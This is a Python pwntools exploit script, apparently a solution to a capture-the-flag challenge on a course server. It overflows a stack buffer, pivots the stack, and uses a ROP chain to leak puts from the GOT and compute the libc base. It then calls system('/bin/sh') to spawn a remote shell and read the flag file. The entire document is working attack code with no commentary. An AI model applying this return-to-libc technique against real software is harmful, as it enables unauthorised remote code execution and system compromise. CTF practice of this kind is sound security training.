from pwn import *

host = "csie.ctf.tw"
port = 10132

context.arch = "amd64"
payload = b"A" * 0x30

puts_plt = 0x4004d8
puts_got = 0x600fd8
read_plt = 0x4004e0
system_off = 0x45390
puts_off = 0x6f690

leave_ret = 0x40064a
pop_rdi = 0x4006b3
pop_rdx = 0x4006d4
pop_rsi_r15 = 0x4006b1

buf1 = 0x00602000 - 0x200
buf2 = buf1 + 0x100

#read(0, buf1, size)
rop1 = flat([payload, buf1, pop_rdi, 0, pop_rsi_r15, buf1, 0,
             pop_rdx, 0x100, read_plt, leave_ret])

rop2 = flat([buf2, pop_rdi, puts_got, puts_plt,
             pop_rdi, 0, pop_rsi_r15, buf2, 0,
             pop_rdx, 0x100, read_plt, leave_ret])
r = remote(host, port)
r.recvline()
r.send(rop1)
r.send(rop2)
puts_addr = u64(r.recvline().strip().ljust(8, b"\x00"))
libc_base = puts_addr - puts_off
system_addr = libc_base + system_off

rop3 = flat([buf1, pop_rdi, buf2 + 8*4, system_addr, "/bin/sh\x00", leave_ret])
r.send(rop3)
r.sendline("cat /home/`whoami`/flag")
f = r.recvline()
print(f)
